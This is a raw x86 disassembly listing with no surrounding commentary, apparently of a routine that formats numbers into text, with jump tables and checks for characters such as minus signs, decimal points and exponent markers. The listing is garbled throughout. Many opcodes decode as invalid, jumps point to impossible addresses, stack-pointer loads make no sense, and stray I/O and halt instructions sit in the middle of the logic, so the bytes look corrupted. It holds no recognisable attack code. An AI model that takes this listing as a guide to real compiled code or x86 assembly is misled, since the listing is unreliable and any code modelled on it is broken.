  4078b8:	8b 53 fc             	mov    -0x4(%ebx),%edx
  4078bb:	c6 45 ec 43          	movb   $0x43,-0x14(%ebp)
  4078bf:	45                   	inc    %ebp
  4078c0:	bc 00 44 22 00       	mov    $0x224400,%esp
  4078c5:	89 02                	mov    %eax,(%edx)
  4078c7:	f7 13                	notl   (%ebx)
  4078c9:	ff                   	(bad)
  4078ca:	ff                   	(bad)
  4078cb:	ff f2                	push   %edx
  4078cd:	f8                   	clc
  4078ce:	02 75 16             	add    0x16(%ebp),%dh
  4078d1:	47                   	inc    %edi
  4078d2:	4b                   	dec    %ebx
  4078d3:	fc                   	cld
  4078d4:	66 8b 55 95          	mov    -0x6b(%ebp),%dx
  4078d8:	c7 45 bc 00 00 3f 00 	movl   $0x3f0000,-0x44(%ebp)
  4078df:	66 29 11             	sub    %dx,(%ecx)
  4078e2:	e9 f8 fe ff ff       	jmp    0x4077df
  4078e7:	8b 43 fc             	mov    -0x4(%ebx),%eax
  4078ea:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4078ed:	c7 45 bc 85 00 00 ff 	movl   $0xff000085,-0x44(%ebp)
  4078f4:	89 08                	mov    %ecx,(%eax)
  4078f6:	e9 c3 fe ff 36       	jmp    0x374077be
  4078fb:	8b 69 10             	mov    0x10(%ecx),%ebp
  4078fe:	40                   	inc    %eax
  4078ff:	89 45 f3             	mov    %eax,-0xd(%ebp)
  407902:	8a 00                	mov    (%eax),%al
  407904:	0f be 02             	movsbl (%edx),%eax
  407907:	83 f9 74             	cmp    $0x74,%ecx
  40790a:	fc                   	cld
  40790b:	b7 63                	mov    $0x63,%bh
  40790d:	01 00                	add    %eax,(%eax)
  40790f:	00 33                	add    %dh,(%ebx)
  407911:	d2 8a 3b 80 7c 40    	rorb   %cl,0x407c803b(%edx)
  407917:	00 ff                	add    %bh,%bh
  407919:	24 95                	and    $0x95,%al
  40791b:	80 6a 40 00          	subb   $0x0,0x40(%edx)
  40791f:	79 69                	jns    0x40798a
  407921:	39 4d fc             	cmp    %ecx,-0x4(%ebp)
  407924:	83 c3 04             	add    $0x4,%ebx
  407927:	8d 55 5d             	lea    0x5d(%ebp),%edx
  40792a:	51                   	push   %ecx
  40792b:	52                   	push   %edx
  40792c:	ad                   	lods   %ds:(%esi),%eax
  40792d:	78 6a                	js     0x407999
  40792f:	04 50                	add    $0x50,%al
  407931:	e8 5a 0c 00 00       	call   0x408590
  407936:	83 f7 14             	xor    $0x14,%edi
  407939:	8b f0                	mov    %eax,%esi
  40793b:	c6 45 25 3c          	movb   $0x3c,0x25(%ebp)
  40793f:	e9 25 fe ff ff       	jmp    0x407769
  407944:	8b 03                	mov    (%ebx),%eax
  407946:	83 c3 11             	add    $0x11,%ebx
  407949:	f1                   	int1
  40794a:	c0 0f 84             	rorb   $0x84,(%edi)
  40794d:	c0 00 00             	rolb   $0x0,(%eax)
  407950:	00 2d 4d 83 8d 55    	add    %ch,0x558d834d
  407956:	ac                   	lods   %ds:(%esi),%al
  407957:	51                   	push   %ecx
  407958:	52                   	push   %edx
  407959:	50                   	push   %eax
  40795a:	e8 51 09 00 00       	call   0x4082b0
  40795f:	8b f0                	mov    %eax,%esi
  407961:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  407964:	83 0a 0c             	orl    $0xc,(%edx)
  407967:	85 c0                	test   %eax,%eax
  407969:	0f 84 ae 00 00 00    	je     0x407a1d
  40796f:	8b 45 f0             	mov    -0x10(%ebp),%eax
  407972:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  407975:	3b c1                	cmp    %ecx,%eax
  407977:	0f 83 a0 00 00 00    	jae    0x407a1d
  40797d:	89 45 fc             	mov    %eax,-0x4(%ebp)
  407980:	2c 45                	sub    $0x45,%al
  407982:	10 20                	adc    %ah,(%eax)
  407984:	e9 56 fe ff ff       	jmp    0x4077df
  407989:	8b 03                	mov    (%ebx),%eax
  40798b:	b8 af 04 85 c2       	mov    $0xc28504af,%eax
  407990:	74 7f                	je     0x407a11
  407992:	8d 4d ef             	lea    -0x11(%ebp),%ecx
  407995:	8d 55 ac             	lea    -0x54(%ebp),%edx
  407998:	51                   	push   %ecx
  407999:	52                   	push   %edx
  40799a:	db e8                	fucomi %st(0),%st
  40799c:	80 08 00             	orb    $0x0,(%eax)
  40799f:	00 eb                	add    %ch,%bl
  4079a1:	bd 8b 41 83 c3       	mov    $0xc383418b,%ebp
  4079a6:	04 85                	add    $0x85,%al
  4079a8:	c0 74 66 8b 10       	shlb   $0x10,-0x75(%esi,%eiz,2)
  4079ad:	8d 8d ac fd ac ff    	lea    -0x530254(%ebp),%ecx
  4079b3:	68 2d 01 00 00       	push   $0x12d
  4079b8:	51                   	push   %ecx
  4079b9:	52                   	push   %edx
  4079ba:	3e 21 0d 73 00 28 f0 	and    %ecx,%ds:0xf0280073
  4079c1:	8f                   	(bad)
  4079c2:	f4                   	hlt
  4079c3:	ff                   	(bad)
  4079c4:	bc 99 fb 1e f2       	mov    $0xf21efb99,%esp
  4079c9:	ae                   	scas   %es:(%edi),%al
  4079ca:	2e d1 49 c6          	rorl   $1,%cs:-0x3a(%ecx)
  4079ce:	45                   	inc    %ebp
  4079cf:	17                   	pop    %ss
  4079d0:	20 89 4d fc e9 06    	and    %cl,0x6e9fc4d(%ecx)
  4079d6:	fe                   	(bad)
  4079d7:	b3 86                	mov    $0x86,%bl
  4079d9:	89 03                	mov    %eax,(%ebx)
  4079db:	83 c3 04             	add    $0x4,%ebx
  4079de:	f9                   	stc
  4079df:	56                   	push   %esi
  4079e0:	74 2f                	je     0x407a11
  4079e2:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  4079e5:	8d 55 ac             	lea    -0x54(%ebp),%edx
  4079e8:	f0 52                	lock push %edx
  4079ea:	50                   	push   %eax
  4079eb:	89 50 53             	mov    %edx,0x53(%eax)
  4079ee:	00 00                	add    %al,(%eax)
  4079f0:	e9 6a ff 6b ff       	jmp    0xffac795f
  4079f5:	8b 03                	mov    (%ebx),%eax
  4079f7:	39 c3                	cmp    %eax,%ebx
  4079f9:	04 32                	add    $0x32,%al
  4079fb:	c0 77 11 8d          	shlb   $0x8d,0x11(%edi)
  4079ff:	4d                   	dec    %ebp
  407a00:	fc                   	cld
  407a01:	8d 55 ac             	lea    -0x54(%ebp),%edx
  407a04:	51                   	push   %ecx
  407a05:	52                   	push   %edx
  407a06:	50                   	push   %eax
  407a07:	e8 54 0c 00 00       	call   0x408660
  407a0c:	e9 2d ff ec ff       	jmp    0x2d793e
  407a11:	be a0 c2 40 00       	mov    $0x40c2a0,%esi
  407a16:	c7 45 fc 06 00 cd 7d 	movl   $0x7dcd0006,-0x4(%ebp)
  407a1d:	c6                   	(bad)
  407a1e:	bc 17 20 e9 b9       	mov    $0xb9e92017,%esp
  407a23:	fd                   	std
  407a24:	ff                   	(bad)
  407a25:	ff 83 b2 04 3c 0f    	incl   0xf3c04b2(%ebx)
  407a2b:	8b 2e                	mov    (%esi),%ebp
  407a2d:	8b 43 fc             	mov    -0x4(%ebx),%eax
  407a30:	85 c0                	test   %eax,%eax
  407a32:	74 16                	je     0x407a4a
  407a34:	8b 00                	mov    (%eax),%eax
  407a36:	eb 14                	jmp    0x407a4c
  407a38:	3c 46                	cmp    $0x46,%al
  407a3a:	75 f1                	jne    0x407a2d
  407a3c:	8b 4b fc             	mov    -0x4(%ebx),%ecx
  407a3f:	7c c9                	jl     0x407a0a
  407a41:	74 8e                	je     0x4079d1
  407a43:	f6 01 8b             	testb  $0x8b,(%ecx)
  407a46:	49                   	dec    %ecx
  407a47:	c1 eb 04             	shr    $0x4,%ebx
  407a4a:	3a 4f 33             	cmp    0x33(%edi),%cl
  407a4d:	c9                   	leave
  407a4e:	8d 55 ac             	lea    -0x54(%ebp),%edx
  407a51:	52                   	push   %edx
  407a52:	51                   	push   %ecx
  407a53:	50                   	push   %eax
  407a54:	e8 e7 de ff 0e       	call   0xf405940
  407a59:	ba e4 83 c9 ff       	mov    $0xffc983e4,%edx
  407a5e:	8b fe                	mov    %esi,%edi
  407a60:	33 c0                	xor    %eax,%eax
  407a62:	f2 ae                	repnz scas %es:(%edi),%al
  407a64:	f7 d1                	not    %ecx
  407a66:	06                   	push   %es
  407a67:	c6 45 17 48          	movb   $0x48,0x17(%ebp)
  407a6b:	43                   	inc    %ebx
  407a6c:	4d                   	dec    %ebp
  407a6d:	fc                   	cld
  407a6e:	e9 6c fd 7f ff       	jmp    0xffc077df
  407a73:	be 48 f4 40 00       	mov    $0x40f448,%esi
  407a78:	c7 45 fc 08 00 85 00 	movl   $0x850008,-0x4(%ebp)
  407a7f:	c6 45 fb 3a          	movb   $0x3a,-0x5(%ebp)
  407a83:	ef                   	out    %eax,(%dx)
  407a84:	c3                   	ret
  407a85:	a9 e9 54 fd ff       	test   $0xfffd54e9,%eax
  407a8a:	ff c6                	inc    %esi
  407a8c:	45                   	inc    %ebp
  407a8d:	ea 25 88 4d f7 8d 75 	ljmp   $0x758d,$0xf74d8825
  407a94:	ff b3 45 fc 02 00    	push   0x2fc45(%ebx)
  407a9a:	00 09                	add    %cl,(%ecx)
  407a9c:	c6                   	(bad)
  407a9d:	d3 17                	rcll   %cl,(%edi)
  407a9f:	20 e9                	and    %ch,%cl
  407aa1:	3a fd                	cmp    %ch,%bh
  407aa3:	ff                   	(bad)
  407aa4:	ff 68 7d             	ljmp   *0x7d(%eax)
  407aa7:	1f                   	pop    %ds
  407aa8:	8b 45 f4             	mov    -0xc(%ebp),%eax
  407aab:	85 c0                	test   %eax,%eax
  407aad:	74 27                	je     0x407ad6
  407aaf:	3b 45 dc             	cmp    -0x24(%ebp),%eax
  407ab2:	72 19                	jb     0x407acd
  407ab4:	57                   	push   %edi
  407ab5:	89 1a                	mov    %ebx,(%edx)
  407ab7:	ad                   	lods   %ds:(%esi),%eax
  407ab8:	55                   	push   %ebp
  407ab9:	08 83 c4 04 fb c0    	or     %al,-0x3f04fb3c(%ebx)
  407abf:	0f b7 fe             	movzwl %si,%edi
  407ac2:	af                   	scas   %es:(%edi),%eax
  407ac3:	00 00                	add    %al,(%eax)
  407ac5:	8b 39                	mov    (%ecx),%edi
  407ac7:	04 8b                	add    $0x8b,%al
  407ac9:	07                   	pop    %es
  407aca:	3e db dc             	ds fcmovnu %st(4),%st
  407acd:	7b 55                	jnp    0x407b24
  407acf:	2d 88 10 40 39       	sub    $0x39401088,%eax
  407ad4:	45                   	inc    %ebp
  407ad5:	e5 8b                	in     $0x8b,%eax
  407ad7:	4d                   	dec    %ebp
  407ad8:	ec                   	in     (%dx),%al
  407ad9:	2e 60                	cs pusha
  407adb:	b5 41                	mov    $0x41,%ch
  407add:	63 af ec 8b 4d e0    	arpl   %ebp,-0x1fb27414(%edi)
  407ae3:	49                   	dec    %ecx
  407ae4:	a3 af 89 dc e0       	mov    %eax,0xe0dc89af
  407ae9:	1d c0 8b 92 bc       	sbb    $0xbc928bc0,%eax
  407aee:	83 f8 01             	cmp    $0x1,%eax
  407af1:	8b 66 f4             	mov    -0xc(%esi),%esp
  407af4:	75 4a                	jne    0x407b40
  407af6:	74 7d                	je     0x407b75
  407af8:	fc                   	cld
  407af9:	85 ff                	test   %edi,%edi
  407afb:	74 43                	je     0x407b40
  407afd:	85 24 74             	test   %esp,(%esp,%esi,2)
  407b00:	34 3b                	xor    $0x3b,%al
  407b02:	45                   	inc    %ebp
  407b03:	dc 72 13             	fdivl  0x13(%edx)
  407b06:	8b 45 0c             	mov    0xc(%ebp),%eax
  407b09:	8b 15 f4 12 d9 08    	mov    0x8d912f4,%edx
  407b0f:	ff 55 08             	call   *0x8(%ebp)
  407b12:	83 c4 04             	add    $0x4,%esp
  407b15:	85 d0                	test   %edx,%eax
  407b17:	0f 85 a6 00 00 00    	jne    0x407bc3
  407b1d:	90                   	nop
  407b1e:	45                   	inc    %ebp
  407b1f:	0c 8b                	or     $0x8b,%al
  407b21:	10 8b 6e 04 89 45    	adc    %cl,0x4589046e(%ebx)
  407b27:	dc 89 55 2d 8b c2    	fmull  -0x3d74d2ab(%ecx)
  407b2d:	8a 0e                	mov    (%esi),%cl
  407b2f:	88 08                	mov    %cl,(%eax)
  407b31:	ff 89 b9 6b 8b 4d    	decl   0x4d8b6bb9(%ecx)
  407b37:	ec                   	in     (%dx),%al
  407b38:	41                   	inc    %ecx
  407b39:	46                   	inc    %esi
  407b3a:	4f                   	dec    %edi
  407b3b:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  407b3e:	75 bd                	jne    0x407afd
  407b40:	8b 4d cc             	mov    -0x34(%ebp),%ecx
  407b43:	85 c9                	test   %ecx,%ecx
  407b45:	56                   	push   %esi
  407b46:	58                   	pop    %eax
  407b47:	9e                   	sahf
  407b48:	4d                   	dec    %ebp
  407b49:	c0 d2 c9             	rcl    $0xc9,%dl
  407b4c:	75 51                	jne    0x407b9f
  407b4e:	8b 55 e0             	mov    -0x20(%ebp),%edx
  407b51:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  407b54:	3b d1                	cmp    %ecx,%edx
  407b56:	76 b6                	jbe    0x407b0e
  407b58:	ef                   	out    %eax,(%dx)
  407b59:	ad                   	lods   %ds:(%esi),%eax
  407b5a:	74 2e                	je     0x407b8a
  407b5c:	3b 45 dc             	cmp    -0x24(%ebp),%eax
  407b5f:	aa                   	stos   %al,%es:(%edi)
  407b60:	20 8b 7d 0c 8b 45    	and    %cl,0x458b0c7d(%ebx)
  407b66:	f4                   	hlt
  407b67:	57                   	push   %edi
  407b68:	89 07                	mov    %eax,(%edi)
  407b6a:	ff 55 08             	call   *0x8(%ebp)
  407b6d:	83 c4 04             	add    $0x4,%esp
  407b70:	85 c0                	test   %eax,%eax
  407b72:	75 f4                	jne    0x407b68
  407b74:	8b 93 8b 57 04 89    	mov    -0x76fba875(%ebx),%edx
  407b7a:	4d                   	dec    %ebp
  407b7b:	9b                   	fwait
  407b7c:	89 55 dc             	mov    %edx,-0x24(%ebp)
  407b7f:	8b c1                	mov    %ecx,%eax
  407b81:	63 4d c0             	arpl   %ecx,-0x40(%ebp)
  407b84:	fa                   	cli
  407b85:	08 40 89             	or     %al,-0x77(%eax)
  407b88:	df f4                	fcomip %st(4),%st
  407b8a:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  407b8d:	8b 55 fc             	mov    -0x4(%ebp),%edx
  407b90:	41                   	inc    %ecx
  407b91:	89 89 35 1f 4d 46    	mov    %ecx,0x464d1f35(%ecx)
  407b97:	49                   	dec    %ecx
  407b98:	3b ca                	cmp    %edx,%ecx
  407b9a:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  407b9d:	77 b9                	ja     0x407b58
  407b9f:	ff 45 77             	incl   0x77(%ebp)
  407ba2:	8b 55 10             	mov    0x10(%ebp),%edx
  407ba5:	8a 50 84             	mov    -0x7c(%eax),%dl
  407ba8:	c0 0f 85             	rorb   $0x85,(%edi)
  407bab:	f3 f5                	repz cmc
  407bad:	ff                   	(bad)
  407bae:	ff 8b 4d 3f 8b 45    	decl   0x458b3f4d(%ebx)
  407bb4:	f4                   	hlt
  407bb5:	5f                   	pop    %edi
  407bb6:	89 27                	mov    %esp,(%edi)
  407bb8:	8b 45 85             	mov    -0x7b(%ebp),%eax
  407bbb:	ce                   	into
  407bbc:	5b                   	pop    %ebx
  407bbd:	8b e5                	mov    %ebp,%esp
  407bbf:	5d                   	pop    %ebp
  407bc0:	c2 10 00             	ret    $0x10
  407bc3:	5f                   	pop    %edi
  407bc4:	00 83 c8 ff 5b 8b    	add    %al,-0x74a40038(%ebx)
  407bca:	e5 5d                	in     $0x5d,%eax
  407bcc:	c2 bd 00             	ret    $0xbd
  407bcf:	90                   	nop
  407bd0:	a2 a1 b2 00 df       	mov    %al,0xdf00b2a1
  407bd5:	78 36                	js     0x407c0d
  407bd7:	00 95 76 40 00 07    	add    %dl,0x7004076(%ebp)
  407bdd:	77 40                	ja     0x407c1f
  407bdf:	8a 8d 75 40 6a 62    	mov    0x626a4075(%ebp),%cl
  407be5:	78 32                	js     0x407c19
  407be7:	00 54 59 40          	add    %dl,0x40(%ecx,%ebx,2)
  407beb:	49                   	dec    %ecx
  407bec:	94                   	xchg   %eax,%esp
  407bed:	78 40                	js     0x407c2f
  407bef:	00 b0 74 40 00 fb    	add    %dh,-0x4ffbf8c(%eax)
  407bf5:	78 40                	js     0x407c37
  407bf7:	00 3c 76             	add    %bh,(%esi,%esi,2)
  407bfa:	70 00                	jo     0x407bfc
  407bfc:	bd 73 40 00 8b       	mov    $0x8b004073,%ebp
  407c01:	1d 57 2e 00 0c       	sbb    $0xc002e57,%eax
  407c06:	0c 0c                	or     $0xc,%al
  407c08:	7b 0c                	jnp    0x407c16
  407c0a:	0c 0c                	or     $0xc,%al
  407c0c:	0c 0c                	or     $0xc,%al
  407c0e:	bf 0c 0c cd 1d       	mov    $0x1dcd0c0c,%edi
  407c13:	0c 2a                	or     $0x2a,%al
  407c15:	d2 0c 97             	rorb   %cl,(%edi,%edx,4)
  407c18:	0c 86                	or     $0x86,%al
  407c1a:	0c 0c                	or     $0xc,%al
  407c1c:	0c 0c                	or     $0xc,%al
  407c1e:	0c f6                	or     $0xf6,%al
  407c20:	0c 0c                	or     $0xc,%al
  407c22:	0c 0c                	or     $0xc,%al
  407c24:	0c 0c                	or     $0xc,%al
  407c26:	0c 0c                	or     $0xc,%al
  407c28:	0c 01                	or     $0x1,%al
  407c2a:	49                   	dec    %ecx
  407c2b:	0c 0c                	or     $0xc,%al
  407c2d:	0c 0c                	or     $0xc,%al
  407c2f:	4e                   	dec    %esi
  407c30:	0c 3b                	or     $0x3b,%al
  407c32:	0c 0c                	or     $0xc,%al
  407c34:	ec                   	in     (%dx),%al
  407c35:	0c b1                	or     $0xb1,%al
  407c37:	9a 9b 0c 0c 0c 0c 0c 	lcall  $0xc0c,$0xc0c0c9b
  407c3e:	dc 0c 0c             	fmull  (%esp,%ecx,1)
  407c41:	0c 0c                	or     $0xc,%al
  407c43:	20 58 0c             	and    %bl,0xc(%eax)
  407c46:	0c 1f                	or     $0x1f,%al
  407c48:	0c 02                	or     $0x2,%al
  407c4a:	74 03                	je     0x407c4f
  407c4c:	0c 0c                	or     $0xc,%al
  407c4e:	0c 0c                	or     $0xc,%al
  407c50:	0c 0c                	or     $0xc,%al
  407c52:	cc                   	int3
  407c53:	0c eb                	or     $0xeb,%al
  407c55:	0e                   	push   %cs
  407c56:	0c 0c                	or     $0xc,%al
  407c58:	0c 0c                	or     $0xc,%al
  407c5a:	0c 0c                	or     $0xc,%al
  407c5c:	04 0c                	add    $0xc,%al
  407c5e:	0c 0c                	or     $0xc,%al
  407c60:	0c 0c                	or     $0xc,%al
  407c62:	0c 0c                	or     $0xc,%al
  407c64:	0c 8b                	or     $0x8b,%al
  407c66:	0c 05                	or     $0x5,%al
  407c68:	06                   	push   %es
  407c69:	d2 02                	rolb   %cl,(%edx)
  407c6b:	03 1a                	add    (%edx),%ebx
  407c6d:	2d 0c 0c cc 0c       	sub    $0xccc0c0c,%eax
  407c72:	07                   	pop    %es
  407c73:	08 09                	or     %cl,(%ecx)
  407c75:	0c 41                	or     $0x41,%al
  407c77:	0a 0c 0b             	or     (%ebx,%ecx,1),%cl
  407c7a:	0c 0c                	or     $0xc,%al
  407c7c:	c6                   	(bad)
  407c7d:	8d bc a3 a2 7b 40 00 	lea    0x407ba2(%ebx,%eiz,4),%edi
  407c84:	da 79 40             	fidivrl 0x40(%ecx)
  407c87:	00 92 7a 40 00 44    	add    %dl,0x4400407a(%edx)
  407c8d:	79 40                	jns    0x407ccf
  407c8f:	00 d9                	add    %bl,%cl
  407c91:	79 40                	jns    0x407cd3
  407c93:	00 38                	add    %bh,(%eax)
  407c95:	79 40                	jns    0x407cd7
  407c97:	00 1f                	add    %bl,(%edi)
  407c99:	79 40                	jns    0x407cdb
  407c9b:	00 dc                	add    %bl,%ah
  407c9d:	79 40                	jns    0x407cdf
  407c9f:	6a d5                	push   $0xffffffd5
  407ca1:	93                   	xchg   %eax,%ebx
  407ca2:	40                   	inc    %eax
  407ca3:	26 00 08             	add    %cl,%es:(%eax)
  407ca6:	08 08                	or     %cl,(%eax)
  407ca8:	08 08                	or     %cl,(%eax)
  407caa:	08 08                	or     %cl,(%eax)
  407cac:	08 08                	or     %cl,(%eax)
  407cae:	08 08                	or     %cl,(%eax)
  407cb0:	f5                   	cmc
  407cb1:	51                   	push   %ecx
  407cb2:	08 08                	or     %cl,(%eax)
  407cb4:	08 08                	or     %cl,(%eax)
  407cb6:	ea 08 08 08 08 08 08 	ljmp   $0x808,$0x8080808
  407cbd:	08 08                	or     %cl,(%eax)
  407cbf:	08 08                	or     %cl,(%eax)
  407cc1:	08 08                	or     %cl,(%eax)
  407cc3:	08 71 08             	or     %dh,0x8(%ecx)
  407cc6:	08 12                	or     %dl,(%edx)
  407cc8:	08 08                	or     %cl,(%eax)
  407cca:	c4 08                	les    (%eax),%ecx
  407ccc:	08 08                	or     %cl,(%eax)
  407cce:	44                   	inc    %esp
  407ccf:	30 08                	xor    %cl,(%eax)
  407cd1:	08 08                	or     %cl,(%eax)
  407cd3:	08 2c a5 08 08 18 08 	or     %ch,0x8180808(,%eiz,4)
  407cda:	08 cd                	or     %cl,%ch
  407cdc:	08 08                	or     %cl,(%eax)
  407cde:	08 08                	or     %cl,(%eax)
  407ce0:	08 08                	or     %cl,(%eax)
  407ce2:	08 08                	or     %cl,(%eax)
  407ce4:	08 01                	or     %al,(%ecx)
  407ce6:	02 08                	add    (%eax),%cl
  407ce8:	08 08                	or     %cl,(%eax)
  407cea:	02 08                	add    (%eax),%cl
  407cec:	08 4f 08             	or     %cl,0x8(%edi)
  407cef:	08 c7                	or     %al,%bh
  407cf1:	08 32                	or     %dh,(%edx)
  407cf3:	08 08                	or     %cl,(%eax)
  407cf5:	08 08                	or     %cl,(%eax)
  407cf7:	02 04 08             	add    (%eax,%ecx,1),%al
  407cfa:	08 08                	or     %cl,(%eax)
  407cfc:	91                   	xchg   %eax,%ecx
  407cfd:	08 c8                	or     %cl,%al
  407cff:	08 08                	or     %cl,(%eax)
  407d01:	08 08                	or     %cl,(%eax)
  407d03:	08 08                	or     %cl,(%eax)
  407d05:	67 08 fb             	addr16 or %bh,%bl
  407d08:	08 08                	or     %cl,(%eax)
  407d0a:	08 6d 08             	or     %ch,0x8(%ebp)
  407d0d:	08 08                	or     %cl,(%eax)
  407d0f:	08 08                	or     %cl,(%eax)
  407d11:	05 08 08 06 08       	add    $0x8060808,%eax
  407d16:	08 08                	or     %cl,(%eax)
  407d18:	07                   	pop    %es
  407d19:	90                   	nop
  407d1a:	90                   	nop
  407d1b:	90                   	nop
  407d1c:	90                   	nop
  407d1d:	90                   	nop
  407d1e:	90                   	nop
  407d1f:	90                   	nop
  407d20:	55                   	push   %ebp
  407d21:	8b ec                	mov    %esp,%ebp
  407d23:	83 ec 58             	sub    $0x58,%esp
  407d26:	56                   	push   %esi
  407d27:	8d                   	lea    (bad),%ebx
  407d28:	dc a8 57 8b 7d 10    	fsubrl 0x107d8b57(%eax)
  407d2e:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  407d31:	f6 8b 45 0c 8d 55 0c 	testb  $0xc,0x558d0c45(%ebx)
  407d38:	30 8b 4d 08 52 57    	xor    %cl,0x5752084d(%ebx)
  407d3e:	50                   	push   %eax
  407d3f:	eb e8                	jmp    0x407d29
  407d41:	82 01 6f             	addb   $0x6f,(%ecx)
  407d44:	00 8b 4d fc 8b 55    	add    %cl,0x558bfc4d(%ebx)
  407d4a:	14 83                	adc    $0x83,%al
  407d4c:	f5                   	cmc
  407d4d:	18 89 45 f8 85 59    	sbb    %cl,0x5985f845(%ecx)
  407d53:	8b f2                	mov    %edx,%esi
  407d55:	74 06                	je     0x407d5d
  407d57:	c6 02 2d             	movb   $0x2d,(%edx)
  407d5a:	8d 72 01             	lea    0x1(%edx),%esi
  407d5d:	b0 04                	mov    $0x4,%al
  407d5f:	ff 53 bd             	call   *-0x43(%ebx)
  407d62:	c9                   	leave
  407d63:	7e 44                	jle    0x407da9
  407d65:	80 3c 01 30          	cmpb   $0x30,(%ecx,%eax,1)
  407d69:	75 06                	jne    0x407d71
  407d6b:	4f                   	dec    %edi
  407d6c:	49                   	dec    %ecx
  407d6d:	85 c9                	test   %ecx,%ecx
  407d6f:	7f f4                	jg     0x407d65
  407d71:	89 7d 10             	mov    %edi,0x10(%ebp)
  407d74:	13 5d 8a             	adc    -0x76(%ebp),%ebx
  407d77:	85 db                	test   %ebx,%ebx
  407d79:	0f df db             	pandn  %mm3,%mm3
  407d7c:	77 00                	ja     0x407d7e
  407d7e:	00 20                	add    %ah,(%eax)
  407d80:	cb                   	lret
  407d81:	2b cf                	sub    %edi,%ecx
  407d83:	83 e8 04             	sub    $0x4,%eax
  407d86:	d3 2b                	shrl   %cl,(%ebx)
  407d88:	b0 00                	mov    $0x0,%al
  407d8a:	00 00                	add    %al,(%eax)
  407d8c:	85 db                	test   %ebx,%ebx
  407d8e:	7f 3b                	jg     0x407dcb
  407d90:	80 38 30             	cmpb   $0x30,(%eax)
  407d93:	1e                   	push   %ds
  407d94:	04 c6                	add    $0xc6,%al
  407d96:	06                   	push   %es
  407d97:	2e 46                	cs inc %esi
  407d99:	d9 db                	(bad)
  407d9b:	7d 2e                	jge    0x407dcb
  407d9d:	8b cb                	mov    %ebx,%ecx
  407d9f:	eb 30                	jmp    0x407dd1
  407da1:	30 30                	xor    %dh,(%eax)
  407da3:	30 f7                	xor    %dh,%bh
  407da5:	d9 89 4d 0c 8b d1    	(bad) -0x2e74f3b3(%ecx)
  407dab:	8b fe                	mov    %esi,%edi
  407dad:	a9 97 02 f3 2c       	test   $0x2cf30297,%eax
  407db2:	02 ca                	add    %dl,%cl
  407db4:	83 e1 3a             	and    $0x3a,%ecx
  407db7:	f3 aa                	rep stos %al,%es:(%edi)
  407db9:	8b 1c 10             	mov    (%eax,%edx,1),%ebx
  407dbc:	8b c2                	mov    %edx,%eax
  407dbe:	8b 55 14             	mov    0x14(%ebp),%edx
  407dc1:	03 77 03             	add    0x3(%edi),%esi
  407dc4:	f0 8b 45 f8          	lock mov -0x8(%ebp),%eax
  407dc8:	89 d4                	mov    %edx,%esp
  407dca:	0c b9                	or     $0xb9,%al
  407dcc:	01 00                	add    %eax,(%eax)
  407dce:	00 00                	add    %al,(%eax)
  407dd0:	3b f9                	cmp    %ecx,%edi
  407dd2:	7c 16                	jl     0x407dea
  407dd4:	8a a5 88 16 46 40    	mov    0x40461688(%ebp),%ah
  407dda:	3b cb                	cmp    %ebx,%ecx
  407ddc:	75 04                	jne    0x407de2
  407dde:	c6 06 2e             	movb   $0x2e,(%esi)
  407de1:	46                   	inc    %esi
  407de2:	98                   	cwtl
  407de3:	3b cf                	cmp    %edi,%ecx
  407de5:	7e ed                	jle    0x407dd4
  407de7:	8b 55 dc             	mov    -0x24(%ebp),%edx
  407dea:	3b 82 7d 22 2b 4d    	cmp    0x4d2b227d(%edx),%eax
  407df0:	b8 9c 30 30 30       	mov    $0x3030309c,%eax
  407df5:	8b cb                	mov    %ebx,%ecx
  407df7:	71 fe                	jno    0x407df7
  407df9:	8b d1                	mov    %ecx,%edx
  407dfb:	94                   	xchg   %eax,%esp
  407dfc:	e9 02 f3 ab 8b       	jmp    0x8bec7103
  407e01:	ca 83 e1             	lret   $0xe183
  407e04:	e6 f6                	out    %al,$0xf6
  407e06:	f3 f3 ee             	repz repz out %al,(%dx)
  407e09:	c6                   	(bad)
  407e0a:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  407e0b:	2e 8b 55 14          	mov    %cs:0x14(%ebp),%edx
  407e0f:	46                   	inc    %esi
  407e10:	8a 46 b4             	mov    -0x4c(%esi),%al
  407e13:	8b 3c 2e             	mov    (%esi,%ebp,1),%edi
  407e16:	0f 85 97 00 78 00    	jne    0xb87eb3
  407e1c:	8b af 18 97 c0 8b    	mov    -0x743f68e8(%edi),%ebp
  407e22:	c2 0f 85             	ret    $0x850f
  407e25:	8c 00                	mov    %es,(%eax)
  407e27:	00 00                	add    %al,(%eax)
  407e29:	c6 46 06 00          	movb   $0x0,0x6(%esi)
  407e2d:	5a                   	pop    %edx
  407e2e:	5e                   	pop    %esi
  407e2f:	01 c4                	add    %eax,%esp
  407e31:	5d                   	pop    %ebp
  407e32:	c3                   	ret
  407e33:	83 fb fd             	cmp    $0xfffffffd,%ebx
  407e36:	c5 8d 50 ff ff ff    	lds    -0xb0(%ebp),%ecx
  407e3c:	4b                   	dec    %ebx
  407e3d:	46                   	inc    %esi
  407e3e:	89 46 0c             	mov    %eax,0xc(%esi)
  407e41:	8a 10                	mov    (%eax),%dl
  407e43:	60                   	pusha
  407e44:	56                   	push   %esi
  407e45:	ff 41 c6             	incl   -0x3a(%ecx)
  407e48:	62 28                	bound  %ebp,(%eax)
  407e4a:	96                   	xchg   %eax,%esi
  407e4b:	83 ff 01             	cmp    $0x1,%edi
  407e4e:	7e 0a                	jle    0x407e5a
  407e50:	4f                   	dec    %edi
  407e51:	8a 08                	mov    (%eax),%cl
  407e53:	88 0e                	mov    %cl,(%esi)
  407e55:	35 40 4f 75 04       	xor    $0x4754f40,%eax
  407e5a:	c6 06 65             	movb   $0x65,(%esi)
  407e5d:	46                   	inc    %esi
  407e5e:	85 db                	test   %ebx,%ebx
  407e60:	7d 07                	jge    0x407e69
  407e62:	f7 ca c6 06 2d eb    	test   $0xeb2d06c6,%edx
  407e68:	c4                   	(bad)
  407e69:	c6 06 2b             	movb   $0x2b,(%esi)
  407e6c:	39 c3                	cmp    %eax,%ebx
  407e6e:	b9 64 00 00 aa       	mov    $0xaa000064,%ecx
  407e73:	99                   	cltd
